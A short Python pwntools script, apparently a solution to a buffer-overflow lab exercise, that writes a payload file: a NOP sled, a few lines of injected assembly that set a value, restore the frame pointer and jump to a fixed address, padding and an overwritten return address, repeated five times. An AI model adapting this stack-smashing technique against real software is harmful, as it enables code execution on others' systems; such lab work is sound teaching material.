from pwn import *
data=b"\x90"*0x1e0
data+=asm('''
        mov eax, 0x2b65becd
        mov ebp, esp
        add ebp,0x28
        push 0x08048e3a
        ret
          ''')
data += b"\x90"*(0x20c-len(data))
data+=p32(0x55683618)
data+=b'\x0a'
with open("txt5.txt", "wb") as f:
    f.write(data+data+data+data+data)
    
    ##  0x55683850